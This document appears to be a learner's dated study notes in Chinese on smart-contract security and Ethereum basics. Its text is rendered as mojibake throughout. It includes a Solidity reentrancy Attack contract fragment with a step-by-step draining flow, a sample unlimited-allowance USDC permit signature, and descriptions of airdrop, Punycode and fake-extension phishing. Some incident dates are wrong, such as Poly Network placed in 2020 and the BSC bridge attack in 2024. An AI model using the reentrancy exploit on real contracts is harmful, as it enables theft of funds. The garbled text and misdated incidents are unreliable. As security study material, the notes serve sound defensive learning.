        // åªè¦ EtherStore åˆçº¦çš„ä½™é¢è¿˜å¤§äº1 ETHï¼Œå°±ç»§ç»­è°ƒç”¨å®ƒçš„ withdraw å‡½æ•°
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        etherStore.deposit{value: 1 ether}(); // å…ˆå­˜å…¥ 1 ETH
        etherStore.withdraw(1 ether);          // å‘èµ·ç¬¬ä¸€æ¬¡ææ¬¾
    }
}

```

æ”»å‡»æµç¨‹ï¼š
1. 1. é»‘å®¢è°ƒç”¨Â `Attack.attack()`ï¼Œå­˜å…¥ 1 ETH åˆ°Â `EtherStore`ï¼Œç„¶åç«‹åˆ»è¦æ±‚æé¢†è¿™ 1 ETHã€‚
2. `EtherStore.withdraw()`Â å¼€å§‹æ‰§è¡Œã€‚å®ƒæ£€æŸ¥é»‘å®¢çš„ä½™é¢ï¼ˆ1 ETHï¼‰ï¼Œæ£€æŸ¥é€šè¿‡ã€‚
3. `EtherStore`Â æ‰§è¡ŒÂ `msg.sender.call{value: 1 ether}("")`ï¼Œè¯•å›¾å°† 1 ETH è¿˜ç»™é»‘å®¢çš„Â `Attack`Â åˆçº¦ã€‚
4. **å…³é”®ç‚¹**ï¼šå½“Â `Attack`Â åˆçº¦æ”¶åˆ°è¿™ç¬”ä»¥å¤ªå¸æ—¶ï¼Œå®ƒçš„Â `fallback()`Â å‡½æ•°è¢«è§¦å‘äº†ã€‚
5. åœ¨Â `fallback()`Â å‡½æ•°ä¸­ï¼Œé»‘å®¢**å†ä¸€æ¬¡ï¼ˆé‡å…¥ï¼‰è°ƒç”¨äº†Â `EtherStore.withdraw()`ï¼Œè¦æ±‚å†æé¢† 1 ETHã€‚
6. **è‡´å‘½æ¼æ´**ï¼šå› ä¸ºÂ `EtherStore`Â çš„ä»£ç è¿˜æ²¡æ‰§è¡Œåˆ°ç¬¬3æ­¥ï¼ˆæ›´æ–°ä½™é¢ï¼‰ï¼Œæ‰€ä»¥å®ƒè´¦ä¸Šçš„è®°å½•ä¾ç„¶æ˜¯ã€Œé»‘å®¢è¿˜æœ‰ 1 ETHã€ã€‚å› æ­¤ï¼Œç¬¬äºŒæ¬¡çš„ä½™é¢æ£€æŸ¥**å†æ¬¡é€šè¿‡**ï¼
7. `EtherStore`Â åˆä¸€æ¬¡å°è¯•å‘é€ 1 ETH ç»™é»‘å®¢ï¼Œè¿™åˆè§¦å‘äº†é»‘å®¢çš„Â `fallback()`ï¼Œå½¢æˆä¸€ä¸ªæ— é™å¾ªç¯ï¼Œç›´åˆ°Â `EtherStore`Â åˆçº¦çš„èµ„é‡‘è¢«æç©ºä¸ºæ­¢ã€‚[åŸç†å’Œé¢„é˜²](https://learnblockchain.cn/article/18336)

- **Poly Networkæ”»å‡»ï¼ˆ2020å¹´ï¼‰**ï¼šè¯¥è·¨é“¾DeFiå¹³å°å› æ™ºèƒ½åˆçº¦æ§åˆ¶æƒè¢«é»‘å®¢å¤ºå–ï¼Œå¯¼è‡´6.12äº¿ç¾å…ƒè¢«ç›—ï¼Œå‡¸æ˜¾æ™ºèƒ½åˆçº¦è·¨é“¾å’Œæ§åˆ¶æƒé™çš„å®‰å…¨é£é™©ã€‚[c-csa](https://c-csa.cn/u_file/photo/20230518/29d8ed085d.pdf)
    
- **é—ªç”µè´·æ”»å‡»äº‹ä»¶**ï¼šå¦‚2020å¹´bZxå€Ÿè´·åè®®é­ä¸¤æ¬¡é—ªç”µè´·æ”»å‡»ï¼ŒæŸå¤±è¿‘ç™¾ä¸‡ç¾å…ƒï¼Œåˆ©ç”¨æ™ºèƒ½åˆçº¦æœºåˆ¶ä¸­çš„ä»·æ ¼é¢„è¨€æœºå’Œå¸‚åœºæ“çºµæ¼æ´è¿›è¡Œæ”»å‡»ã€‚2023å¹´Euler Financeåˆ©ç”¨é—ªç”µè´·æ¼æ´è¢«ç›—çº¦1.97äº¿ç¾å…ƒï¼Œäº¦æ˜¯æ™ºèƒ½åˆçº¦ä¸­çš„å¸‚åœºæœºåˆ¶æ¼æ´åˆ©ç”¨å…¸å‹ã€‚[panewslab+2](https://www.panewslab.com/zh/articles/oebo032n)
    
- **Parityå¤šé‡ç­¾åé’±åŒ…æ¼æ´ï¼ˆ2017å¹´ï¼‰**ï¼šå› æ™ºèƒ½åˆçº¦åº“å­˜åœ¨æ¼æ´ï¼Œçº¦51.37ä¸‡ä¸ªä»¥å¤ªå¸è¢«æ°¸ä¹…é”å®šã€‚[c-csa](https://c-csa.cn/about/news-detail/i-336.html)
    
- **Bancorå¹³å°ç®¡ç†å‘˜æƒé™è¢«ç›—ï¼ˆ2018å¹´ï¼‰**ï¼šæ™ºèƒ½åˆçº¦ä¸­ç®¡ç†å‘˜æƒé™è¿‡é«˜å¯¼è‡´ç›—å–ä»·å€¼æ•°åƒä¸‡ç¾å…ƒå¸èµ„ã€‚[c-csa](https://c-csa.cn/about/news-detail/i-336.html)
    
- **Lendf.Meé‡å…¥æ¼æ´æ”»å‡»ï¼ˆ2020å¹´ï¼‰**ï¼šæ™ºèƒ½åˆçº¦ä¸­å­˜åœ¨é‡å…¥æ¼æ´å’Œç‰¹å®šä»£å¸å…¼å®¹æ€§é—®é¢˜ï¼Œå¯¼è‡´2500ä¸‡ç¾å…ƒèµ„äº§è¢«ç›—ã€‚[ç®€ä»‹](https://abmedia.io/lendf-me-hacked-details-analysis-and-defense-suggestions)
    
- **è·¨é“¾æ¡¥æ™ºèƒ½åˆçº¦æ¼æ´æ”»å‡»ï¼ˆ2024å¹´ï¼‰**ï¼šå¦‚BSC Token Hubè·¨é“¾æ¡¥è¢«æ”»å‡»ï¼Œä¼ªé€ äº¤æ˜“æå–å¤§é‡å¸ï¼Œæ˜¾ç¤ºè·¨é“¾æ™ºèƒ½åˆçº¦é£é™©å±…é«˜ä¸ä¸‹ã€‚[ç®€ä»‹](https://blog.csdn.net/weixin_42056967/article/details/127212623)
- åŸå› ï¼šMerkleéªŒè¯æœºåˆ¶çš„æ¼æ´
	- BNBé“¾ä¸Šçš„é¢„ç¼–è¯‘åˆçº¦ï¼ˆåœ°å€0x65ï¼‰è´Ÿè´£éªŒè¯è·¨é“¾æäº¤çš„Merkle Proofï¼Œä½†å®ƒå¯¹åŒ…å«å¤šä¸ªå¶å­èŠ‚ç‚¹ï¼ˆLeavesï¼‰çš„Proofå¤„ç†ä¸ä¸¥è°¨ï¼Œåªé’ˆå¯¹å•ä¸ªå¶å­çš„æƒ…å†µéªŒè¯ï¼Œå¯¼è‡´è¾¹ç•Œæƒ…å†µå¤„ç†æ¼æ´ã€‚   
	- æ”»å‡»è€…æ„é€ åŒ…å«å¤šä¸ªå¶å­çš„æ¶æ„Proofæ•°æ®ï¼Œç»•è¿‡äº†åˆçº¦çš„æ ¡éªŒæœºåˆ¶ï¼Œä»è€Œè™šå‡è¯æ˜äº†å¤§é‡BNBçš„åˆæ³•æ€§ï¼Œåˆçº¦è¯¯åˆ¤é€šè¿‡éªŒè¯ï¼Œé€ æˆäº†BNBçš„é¢å¤–å¢å‘ã€‚

# 2025-08-07

# USDC Permit é‡£é­š
```
é€šéä½¿ç”¨ EIP-2612 permit ç°½å, å…è¨±åœ°å€ 0x1234...7890 ä½¿ç”¨ä½ çš„å…¨éƒ¨ USDC é¤˜é¡ï¼Œç›´åˆ° 2025/9/6 17:36:29
 "message": {
    "owner": "0xBF654d909728d4a40ADBFfB2A5Dc540827D158D8",
    // æˆæƒçš„åœ°å€
    "spender": "0x1234567890123456780012345678901234567890",
    //æ— é™åˆ¶é‡‘é¢
    "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    "nonce": 239360,
    // è¿‡æœŸæ—¶é—´
    "deadline": 1757151389
  },
   "signature": "0xb7acd5664a80a168686b63e6a568de4ae24b8859adfae99c704c3d58ec2d1c1836885351342772d18411a76c48dc776ade1c6e6c2a60f129feabad8aff5d08581b",
  "r": "0xb7acd5664a80a168686b63e6a568de4ae24b8859adfae99c704c3d58ec2d1c18",
  "s": "0x36885351342772d18411a76c48dc776ade1c6e6c2a60f129feabad8aff5d0858",
  "v": 27
```

# ç©ºå¤´è¯ˆéª—
å‘åˆçº¦f832a0å‘é€0.5ETHã€‚
å‡½æ•°é€‰æ‹©å™¨è°ƒç”¨SecurityUpdate() çš„å‡½æ•°ï¼Œå°†èµ„é‡‘è½¬ç§»ç»™æ”»å‡»è€…
![](Pasted%20image%2020250807174651.png)
# æˆæƒé’“é±¼æ”»å‡»
å½“å¿ƒincreaseAllowanceå‡½æ•°ï¼Œå¯ä»¥å¢åŠ ä»£å¸æˆæƒé¢åº¦
![](Pasted%20image%2020250807175204.png)

# è¶…é«˜æ”¶ç›Šè³ªæŠ¼å¹³å°
```
é¢„è®¡å˜åŒ–
æ‚¨æ­£åœ¨æˆäºˆå…¶ä»–äººä»æ‚¨çš„è´¦æˆ·ä¸­èŠ±è´¹è¯¥é‡‘é¢çš„æƒé™ã€‚
æ”¯å‡ºä¸Šé™
**æ— é™åˆ¶**
0x87350...57C75
æ¶ˆè´¹è€…
0x00000...60000
è¯·æ±‚æ¥è‡ª
unphishable.io
```

# Telegram ä»£å¹£é‡£é­šæŒ‘æˆ°
* æœªç¶“è«‹æ±‚çš„å…è²»ä»£å¹£æˆ–ç©ºæŠ•æ¶ˆæ¯
- é ˜å–çå‹µçš„ç·Šè¿«æ„Ÿæˆ–æ™‚é–“å£“åŠ›
- è¦æ±‚æä¾›åŠ©è¨˜è©æˆ–ç§é‘°
- æ‰¿è«¾é«˜åƒ¹å€¼çå‹µ
- èªæ³•æˆ–æ‹¼å¯«éŒ¯èª¤
# Punycode é‡£é­šæ”»æ“Š
å®šä¹‰ï¼šPunycode æ˜¯ä¸€ç§ç¼–ç ç³»ç»Ÿï¼Œå…è®¸å°†é ASCII å­—ç¬¦ï¼ˆå¦‚è¥¿é‡Œå°”å­—æ¯ã€ä¸­æ–‡ç­‰ï¼‰è½¬æ¢ä¸º ASCII å­—ç¬¦ï¼Œä»¥ä¾¿åœ¨åŸŸåç³»ç»Ÿä¸­ä½¿ç”¨ã€‚æ”»å‡»è€…ç»å¸¸åˆ©ç”¨è§†è§‰ä¸Šç›¸ä¼¼çš„å­—ç¬¦åˆ›å»ºçœ‹ä¼¼åˆæ³•çš„åŸŸåã€‚ ä¾‹å¦‚ï¼ŒæŸäº›ç‰¹æ®Šå­—ç¬¦çœ‹èµ·æ¥ä¸æ‹‰ä¸å­—æ¯å‡ ä¹ç›¸åŒï¼Œä½†å®ƒä»¬æ˜¯ä¸åŒçš„å­—ç¬¦ï¼š ä½ å¯ä»¥ä½¿ç”¨Â [Punycoder](https://www.punycoder.com/)Â æ¥è½¬æ¢ Unicode å’Œ Punycode åŸŸåã€‚

# Microsoft Teams æ¶æ„è½¯ä»¶é’“é±¼æ¨¡æ‹Ÿ
* å¯ç–‘ URLï¼šæ³¨æ„åŸŸåæ˜¯ "microsoft-meet.com" è€Œä¸æ˜¯ "teams.microsoft.com"
- ç®€åŒ–ç•Œé¢ï¼šä¸çœŸå®çš„ Teams ç™»å½•ç›¸æ¯”ï¼Œè™šå‡é¡µé¢å…·æœ‰ç®€åŒ–çš„ç•Œé¢
- ç¼ºä¹å®‰å…¨åŠŸèƒ½ï¼šç¼ºå°‘ Microsoft é€šå¸¸åŒ…å«çš„å®‰å…¨å…ƒç´ 
- åŠ å…¥æŒ‰é’®ï¼šçªå‡ºçš„ "åœ¨ Teams åº”ç”¨ç¨‹åºä¸­åŠ å…¥" æŒ‰é’®å¯èƒ½ä¼šå¯¼è‡´æ¶æ„è½¯ä»¶ä¸‹è½½
- TEAMS_MALWARE_2025

# å‡å†’æ‰©å±•é’“é±¼
å®‰è£…è™šå‡æ‰©å±•ç¨‹åºåŠæ³•ï¼š
1. åˆ›å»ºä¸€ä¸ªæ–°é’±åŒ…ï¼ˆæœ€å¥½åœ¨æ–°æµè§ˆå™¨ä¸Šï¼‰å¹¶å°†æ‰€æœ‰èµ„é‡‘ä»å—æŸé’±åŒ…ä¸­è½¬å‡º
2. å¸è½½æ‰©å±•ç¨‹åº
3. æ›´æ”¹æ‰€æœ‰å¯èƒ½å·²è¢«æ³„éœ²çš„å¯†ç 
4. æ£€æŸ¥æ‚¨çš„åŠ å¯†è´§å¸é’±åŒ…ä¸­æ˜¯å¦æœ‰æœªç»æˆæƒçš„äº¤æ˜“
5. ä½¿ç”¨ä¿¡èª‰è‰¯å¥½çš„é˜²ç—…æ¯’è½¯ä»¶æ‰«ææ‚¨çš„è®¾å¤‡ä»¥æŸ¥æ‰¾æ¶æ„è½¯ä»¶
6. ç›‘æ§æ‚¨çš„è´¦æˆ·æ˜¯å¦æœ‰å¯ç–‘æ´»åŠ¨
7. è€ƒè™‘ä½¿ç”¨ç¡¬ä»¶é’±åŒ…ä»¥è·å¾—é¢å¤–å®‰å…¨æ€§

# 2025-08-06

ç›®æ¨™ï¼šæ™ºèƒ½åˆç´„å·¥ç¨‹å¸«
* é–‹ç™¼ã€éƒ¨ç½²æ™ºèƒ½åˆç´„ï¼Œç¢ºä¿åˆç´„çš„å®‰å…¨æ€§ã€å¯é æ€§ã€é«˜æ•ˆæ€§
* solidity(ç¾åœ¨solanaä½¿ç”¨çš„æ˜¯rust)
* æ ¹æ“šéœ€æ±‚è¨­è¨ˆåˆé©çš„æ™ºèƒ½åˆç´„æ¶æ§‹
* éƒ¨ç½²æ™ºèƒ½åˆçº¦è‡³åŒºå—é“¾ç½‘ç»œï¼ˆå¦‚ä»¥å¤ªåŠã€Polygonã€Arbitrumã€Base ç­‰ï¼‰ï¼Œå¹¶ç¡®ä¿åˆçº¦çš„é«˜æ•ˆæ‰§è¡Œã€‚
- ç¼–å†™æ™ºèƒ½åˆçº¦çš„å•å…ƒæµ‹è¯•ï¼Œè¿›è¡Œä»£ç å®¡è®¡ä¸å®‰å…¨æ€§æµ‹è¯•ï¼Œç¡®ä¿åˆçº¦ä»£ç æ— æ¼æ´ï¼Œé¿å…æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚
- å„ªåŒ–åˆç´„ï¼Œæ¸›å°‘gasè²»ç”¨
- ç†Ÿæ‚‰ Ethereumã€Polygonã€Arbitrumã€Base ç­‰ä¸»æµåŒºå—é“¾å¹³å°ï¼Œèƒ½å¤Ÿåœ¨è¿™äº›å¹³å°ä¸Šéƒ¨ç½²å’Œç»´æŠ¤æ™ºèƒ½åˆçº¦
- äº†è§£æ™ºèƒ½åˆçº¦å¼€å‘çš„å®‰å…¨æ€§é—®é¢˜ï¼Œå…·å¤‡æ™ºèƒ½åˆçº¦å®¡è®¡å’Œæ¼æ´ä¿®å¤ç»éªŒï¼Œç†Ÿæ‚‰å¸¸è§çš„æ”»å‡»æ¨¡å¼ï¼ˆå¦‚é‡å…¥æ”»å‡»ã€æº¢å‡ºã€æƒé™ç®¡ç†ç­‰ï¼‰
- ç†Ÿæ‚‰åŒºå—é“¾çš„åŸºæœ¬åŸç†ï¼Œç†è§£ Gas è´¹ç”¨ã€äº¤æ˜“ç¡®è®¤ã€åŒºå—é“¾å…±è¯†æœºåˆ¶ç­‰æ¦‚å¿µã€‚
- ç†Ÿç»ƒä½¿ç”¨ Foundryã€Hardhatã€Remix ç­‰æ™ºèƒ½åˆçº¦å¼€å‘æ¡†æ¶ï¼Œå…·å¤‡é¡¹ç›®å¼€å‘ã€æµ‹è¯•ä¸éƒ¨ç½²ç»éªŒã€‚
- å…·å¤‡ä¸€å®šçš„ Viemã€Web3.jsã€Ethers.js ç­‰ Web3 å·¥å…·ä½¿ç”¨ç»éªŒï¼Œèƒ½å¤Ÿä¸å‰ç«¯æˆ–å…¶ä»–ç³»ç»Ÿè¿›è¡Œæ— ç¼é›†æˆã€‚
- ç†Ÿæ‚‰ IPFSã€NFTã€Token æ ‡å‡†ï¼ˆERC-20ã€ERC-721ã€ERC-1155 ç­‰ï¼‰åŠå»ä¸­å¿ƒåŒ–èº«ä»½ï¼ˆDIDï¼‰ç­‰ Web3 ç›¸å…³æŠ€æœ¯
```# å¸¸ç”¨æŠ€æœ¯æ ˆ
- Solidity
- Remix
- Foundry / Hardhat
- Phalcon / Tenderly
- Yul
```
æ±‚è·å¹³è‡ºï¼š
- [DeJob](https://www.dejob.top/)Â - ä¸­æ–‡ï¼Œå¤§é‡é«˜é¢‘å·¥ä½œæœºä¼š
- [SmartDeer](https://www.smartdeer.com/)Â - ä¸­æ–‡ï¼Œç»¼åˆæ€§çš„æ‹›è˜å¹³å°
- [ç”µé¸­ç¤¾åŒº](https://eleduck.com/)Â - ä¸­æ–‡ï¼Œè¿œç¨‹å·¥ä½œè€…ç¤¾åŒº
- [Web3Career](https://web3.career/)Â - è‹±æ–‡ï¼Œä¸“ä¸šçš„ Web3 æ‹›è˜å¹³å°
- [CryptoJobs](https://crypto.jobs/)Â - è‹±æ–‡ï¼ŒåŒºå—é“¾è¡Œä¸šæ‹›è˜ä¿¡æ¯
- [LInkedin](http://linkedin.com/) - è‹±æ–‡

# 2025-08-05

## æ™ºèƒ½åˆçº¦
å®šä¹‰ï¼šå­˜å‚¨åœ¨åŒºå—é“¾ä¸Šçš„å¯æ‰§è¡Œä»£ç ï¼Œèƒ½å¤Ÿåœ¨æ»¡è¶³é¢„è®¾æ¡ä»¶æ—¶è‡ªåŠ¨æ‰§è¡Œæ“ä½œï¼Œæ— éœ€äººå·¥å¹²é¢„ã€‚
å½±å“ï¼šåœ¨æ•°å­—è´§å¸ä»¥å¤–ï¼Œå¯ä»¥æ„å»ºå»ä¸­å¿ƒåŒ–åº”ç”¨(DApp)ã€éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰ç­‰ç”Ÿæ€ç³»ç»Ÿçš„åŸºç¡€è®¾æ–½

|ç»´åº¦|æ¯”ç‰¹å¸ï¼ˆBitcoinï¼‰|ä»¥å¤ªåŠï¼ˆEthereumï¼‰|
|---|---|---|
|**ç›®æ ‡ä¸å®šä½**|å»ä¸­å¿ƒåŒ–çš„æ•°å­—è´§å¸ï¼Œå¼ºè°ƒå®‰å…¨ã€ç¨³å®šå’Œç¨€ç¼ºæ€§ï¼ˆæ€»é‡ 2100 ä¸‡æšï¼‰|å»ä¸­å¿ƒåŒ–å¹³å°ï¼Œæ”¯æŒæ™ºèƒ½åˆçº¦å’Œ Dappsï¼Œå®šä½ä¸ºâ€œåŒºå—é“¾ 2.0â€|
|**ç¼–ç¨‹èƒ½åŠ›**|è„šæœ¬è¯­è¨€æœ‰é™ï¼Œä»…æ”¯æŒç®€å•çš„äº¤æ˜“éªŒè¯é€»è¾‘|å›¾çµå®Œå¤‡çš„ç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚ Solidityï¼‰ï¼Œå¯å¼€å‘å¤æ‚æ™ºèƒ½åˆçº¦|
|**å…±è¯†æœºåˆ¶**|å·¥ä½œé‡è¯æ˜ï¼ˆPoWï¼‰ï¼ŒçŸ¿å·¥é€šè¿‡ç®—åŠ›ç«äº‰è®°è´¦æƒ|ä» PoW è½¬å‘æƒç›Šè¯æ˜ï¼ˆPoSï¼‰ï¼Œé€šè¿‡ The Merge å®ç°èƒ½æºæ•ˆç‡ä¼˜åŒ–|
|**äº¤æ˜“é€Ÿåº¦**|æ¯ 10 åˆ†é’Ÿç”Ÿæˆä¸€ä¸ªåŒºå—ï¼Œäº¤æ˜“ç¡®è®¤è¾ƒæ…¢|åŒºå—æ—¶é—´çº¦ 12 ç§’ï¼Œäº¤æ˜“ç¡®è®¤æ›´å¿«ï¼Œé€‚åˆé«˜é¢‘åº”ç”¨|
|**ç»æµæ¨¡å‹**|æ€»é‡å›ºå®šï¼Œå¼ºè°ƒæŠ—é€šèƒ€å±æ€§|ä¾›åº”çµæ´»ï¼Œé€šè¿‡ EIP-1559 ç­‰æœºåˆ¶å¯èƒ½å‘ˆç°é€šç¼©è¶‹åŠ¿|


## ä»¥å¤ªåŠæ¼”è¿›
### 1.0
ä½¿ç”¨PoW(å·¥ä½œé‡è¯æ˜)
* çŸ¿å·¥é€šè¿‡è®¡ç®—æœºç®—åŠ›â€œæŒ–çŸ¿â€ï¼Œäº‰å¤ºæ‰“åŒ…äº¤æ˜“çš„æƒåˆ©ã€‚
- çŸ¿å·¥éœ€è¦æ¶ˆè€—å¤§é‡ç”µåŠ›èµ„æºï¼Œç«äº‰æ¿€çƒˆã€‚
- æˆåŠŸæ‰“åŒ…åŒºå—çš„çŸ¿å·¥ä¼šè·å¾—æ–°ç”Ÿæˆçš„ ETH å¥–åŠ±ã€‚
é—®é¢˜ï¼š
* **èƒ½è€—é«˜**ï¼šå…¨çƒä»¥å¤ªåŠçŸ¿å·¥çš„ç”µåŠ›æ¶ˆè€—ç›¸å½“äºä¸€ä¸ªå°å›½å®¶çš„ç”¨ç”µé‡ã€‚
- **æ‰©å±•æ€§å·®**ï¼šæ¯ç§’åªèƒ½å¤„ç†çº¦ 30 ç¬”äº¤æ˜“ï¼ˆTPSï¼‰ï¼Œé€Ÿåº¦æ…¢ã€è´¹ç”¨é«˜ã€‚
è§£å†³æ–¹æ¡ˆï¼š
* Homesteadï¼šä¿®å¤å®‰å…¨æ¼æ´ï¼Œä¼˜åŒ– Gas è®¡ç®—ï¼ŒåŠ å…¥æ–°æ“ä½œç ã€‚
* Metropolisï¼š
	* Byzantiumï¼š
		* å¼•å…¥ zkSNARKs æ”¯æŒï¼ˆé›¶çŸ¥è¯†è¯æ˜ï¼‰ã€‚
		- é™ä½éš¾åº¦ç‚¸å¼¹(Difficulty Bomb)å½±å“ï¼ˆæ¨è¿ŸPoSåˆ‡æ¢æ—¶é—´ï¼‰
	* Constantinopleï¼š
		* å‡å°‘æŸäº›æ“ä½œGasè´¹ç”¨ã€‚  
		- å»¶åéš¾åº¦ç‚¸å¼¹ã€‚
		- PS: Difficulty Bomb = æŒ–çŸ¿è¶Šæ¥è¶Šéš¾ + åŒºå—æ—¶é—´å˜é•¿ + ä»¥å¤ªåŠâ€œå†»ç»“â€ = ç¤¾åŒºå¿…é¡»å‡çº§æˆ–åœæ‘†ã€‚
- Istanbulï¼š
	- æå‡EVMæ€§èƒ½ã€‚
	* åŠ å¼ºä¸Zcashç­‰å…¶ä»–é“¾çš„å…¼å®¹æ€§ã€‚

### 2.0
äº‹ä»¶ï¼šThe Merge
* Beacon Chainï¼š
	* å¼•å…¥PoS
	* å®ç°è´¨æŠ¼æœºåˆ¶
	* æ„å»ºPoSéªŒè¯è€…ç½‘ç»œ
	* å’Œä¸»ç½‘å¹¶è¡Œå­˜åœ¨ï¼Œäº’ä¸å¹²æ‰°
* London å‡çº§
	* æ”¹é©äº¤æ˜“æ‰‹ç»­è´¹æœºåˆ¶ï¼Œå¼•å…¥'åŸºç¡€è´¹+å°è´¹'æ¨¡å‹
	* æé«˜Gasé¢„æµ‹å‡†ç¡®æ€§ï¼Œå‡å°‘ç½‘ç»œæ‹¥å µ
	* ä¸€éƒ¨åˆ† ETH ä¼šè¢«é”€æ¯ï¼ˆdeflationary mechanismï¼‰
* **The Merge**(2022.09.15)
	* æ­£å¼ä» PoW åˆ‡æ¢è‡³ PoSï¼Œæ ‡å¿—æ€§å‡çº§
	* Beacon é“¾æ¥ç®¡å…±è¯†, å°†å…±è¯†æœºåˆ¶â€œæ’æ¥â€åˆ°ä¿¡æ ‡é“¾çš„ PoS ç³»ç»Ÿ   
	- åºŸé™¤æŒ–çŸ¿ï¼Œæé«˜ç½‘ç»œå®‰å…¨
	- PoSï¼š
		- å‡†å…¥é—¨æ§›ï¼šè´¨æŠ¼ 32 ETH æˆä¸ºéªŒè¯è€…
		- å·¥ä½œæ–¹å¼ï¼šç³»ç»Ÿéšæœºé€‰æ‹©éªŒè¯è€…æ¥æè®®å’ŒéªŒè¯åŒºå—
		- å¥–åŠ±æœºåˆ¶ï¼šéªŒè¯è€…è·å¾—æ–°å‘è¡Œçš„ ETH + äº¤æ˜“è´¹ç”¨
		- æƒ©ç½šæœºåˆ¶ï¼šä½œæ¶è€…è´¨æŠ¼çš„ ETH è¢«é”€æ¯ï¼ˆSlashingï¼‰
		* ç›¸æ¯” PoW çš„ä¼˜åŠ¿
			- **èƒ½è€—é™ä½ 99.95%**ï¼šæ— éœ€å¤§é‡ç”µåŠ›å’Œç¡¬ä»¶
			- **ç»æµå®‰å…¨æ€§**ï¼šæ”»å‡»æˆæœ¬çº¦éœ€æ§åˆ¶å…¨ç½‘ 67% çš„è´¨æŠ¼ ETHï¼ˆä»·å€¼æ•°ç™¾äº¿ç¾å…ƒï¼‰
			- **æœ€ç»ˆç¡®å®šæ€§**ï¼šåŒºå—ç¡®è®¤æ›´å¿«ã€æ›´å¯é 
- Shapellaï¼ˆShanghai + Capellaï¼Œ2023.04ï¼‰:
	- æ”¯æŒè´¨æŠ¼ ETH çš„ææ¬¾ï¼ˆEIP-4895ï¼‰
- Dencunï¼ˆDeneb + Cancunï¼‰:
	- å®ç°æ•°æ®åˆ†ç‰‡åŸå‹ï¼Œé™ä½L2è´¹ç”¨ï¼Œæé«˜æ‰©å®¹æ€§ã€‚
	- ä¸“æ³¨äº**æ•°æ®åˆ†ç‰‡**ï¼Œé…åˆ Layer 2 å®ç°æ‰©å®¹
	- ä¸»ç½‘ä¸“æ³¨å®‰å…¨å’Œæ•°æ®å¯ç”¨æ€§ï¼ŒLayer 2 è´Ÿè´£å¤§é‡äº¤æ˜“å¤„ç†
	- å¼•å…¥ Proto-Dankshardingï¼ˆEIP-4844ï¼‰
		- **é—®é¢˜**ï¼šä»¥å‰ L2 æäº¤æ•°æ®éœ€è¦ä½¿ç”¨å¸¸è§„äº¤æ˜“ï¼Œæˆæœ¬é«˜æ˜‚
		- **è§£å†³æ–¹æ¡ˆ**ï¼šå¼•å…¥ä¸“é—¨çš„â€œBlob äº¤æ˜“â€ç±»å‹ï¼Œæ•°æ®å­˜å‚¨æˆæœ¬å¤§å¹…é™ä½
		- **æŠ€æœ¯ç»†èŠ‚**ï¼šBlob æ•°æ®ä¼šåœ¨ä¸€å®šæ—¶é—´åè‡ªåŠ¨åˆ é™¤ï¼Œä¸ä¼šæ°¸ä¹…å ç”¨ä¸»ç½‘å­˜å‚¨
	- ZK-Rollup
		- **æ‰¹é‡å¤„ç†**ï¼šåœ¨é“¾ä¸‹ä¸€æ¬¡æ€§å¤„ç†æ•°ç™¾ç¬”äº¤æ˜“
		- **é›¶çŸ¥è¯†è¯æ˜**ï¼šç”Ÿæˆä¸€ä¸ªç®€æ´çš„â€œæ­£ç¡®æ€§è¯æ˜â€
		- **ä¸»ç½‘éªŒè¯**ï¼šä»¥å¤ªåŠåªéœ€éªŒè¯è¿™ä¸ªè¯æ˜ï¼Œæ— éœ€é‡æ–°æ‰§è¡Œæ‰€æœ‰äº¤æ˜“

# 2025-08-04

# åŒºå—é“¾
* å®šä¹‰ï¼šå»ä¸­å¿ƒåŒ–çš„åˆ†å¸ƒå¼è´¦æœ¬æŠ€æœ¯ï¼Œç”¨äºåœ¨ç½‘ç»œèŠ‚ç‚¹ä¹‹é—´å®‰å…¨ã€é€æ˜ä¸”ä¸å¯ç¯¡æ”¹åœ°è®°å½•äº‹åŠ¡æ•°æ®ã€‚
* ç»„æˆï¼šåŒºå— + é“¾
	* åŒºå—ï¼šäº¤æ˜“è®°å½• + å‰ä¸€ä¸ªåŒºå—hash
		* å­˜å‚¨æœ‰é™(å­˜å‚¨æ˜¯çœŸçš„è´µå•Š)
			* ä¸»è¦è§£å†³æ–¹æ¡ˆï¼š
				* **é“¾ä¸‹å­˜å‚¨+é“¾ä¸ŠéªŒè¯**ï¼šIPFSã€Swarmã€Arweave ç­‰å…´èµ·ï¼Œé“¾ä¸Šä»…å­˜æ‘˜è¦æˆ–å¼•ç”¨
				* **æ¨¡å—åŒ–åŒºå—é“¾ / æ•°æ®å¯ç”¨æ€§å±‚**ï¼šCelestiaã€Availã€EigenDAã€‚â€œå…±è¯†â€â€œæ‰§è¡Œâ€â€œæ•°æ®å¯ç”¨æ€§â€æ‹†åˆ†æˆç‹¬ç«‹æ¨¡å—ï¼Œæ•°æ®å±‚åªè´Ÿè´£å¹¿æ’­æ•°æ®ï¼Œä¸å¿…æ‰€æœ‰èŠ‚ç‚¹éƒ½å­˜å‚¨
				* **Layer 2 Rollup + Validity/Optimistic Proofs**ï¼šzkRollupï¼ŒOptimistic Rollupï¼ˆArbitrum, Optimismï¼‰ã€‚å°†å¤§é‡äº¤æ˜“å’Œæ•°æ®åœ¨é“¾ä¸‹å¤„ç†ï¼Œä»…å°†ç»“æœåŠè¯æ˜å›ä¼ ä¸»é“¾
				* **å»ä¸­å¿ƒåŒ–æ•°æ®åº“å’Œç´¢å¼•æœåŠ¡**ï¼šThe Graphã€Lighthouseã€Fluenceã€‚æä¾›ç´¢å¼•å’ŒæŸ¥è¯¢æœåŠ¡ï¼Œå°†å¤æ‚æ•°æ®æŸ¥è¯¢ä»é“¾ä¸Šç§»è‡³é“¾ä¸‹
		* æ¯ä¸ªåŒºå—ä¼šåœ¨ä¸€å®šæ—¶é—´å†…æ‰“åŒ…ï¼Œä¾‹å¦‚å¤§æ¦‚ 10 åˆ†é’Ÿæ‰“åŒ…ç”Ÿæˆä¸€ä¸ª(BTC)ã€‚å¦‚ä¸‹è¡¨

| åŒºå—é“¾                     | å…±è¯†æœºåˆ¶                  | æ‰“åŒ…æ—¶é—´       | ç‰¹ç‚¹                               |
| ----------------------- | --------------------- | ---------- | -------------------------------- |
| **æ¯”ç‰¹å¸**                 | PoW (SHA-256)         | ~10 åˆ†é’Ÿ     | æœ€ç¨³å¥ï¼Œå‡ºå—æ…¢ï¼Œå®‰å…¨æ€§é«˜                     |
